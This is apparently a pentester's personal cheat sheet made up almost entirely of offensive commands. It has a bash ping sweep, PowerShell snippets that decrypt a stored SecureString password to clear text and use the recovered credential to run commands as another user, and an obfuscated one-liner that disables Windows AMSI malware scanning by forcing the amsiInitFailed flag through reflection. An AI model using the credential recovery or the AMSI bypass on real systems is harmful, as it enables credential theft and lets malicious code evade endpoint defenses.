# ps
ps = ping sweep

just some note will add here
# 
```bash
for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
```

#
convert encrypted powershell password into clear text:
```powershell
$pwd = ConvertTo-SecureString <encrypted text here>
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList "User",$pwd
$cred.GetNetworkCredential()
```
to Execute Command in powershell as another user without runasCs :
```powershell
invoke-command -Computername localhost -Credential $cred -ScriptBlock { whoami }
```
note: you might find yourself in more restriction for using invoke-command rather than RunasCs 


```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
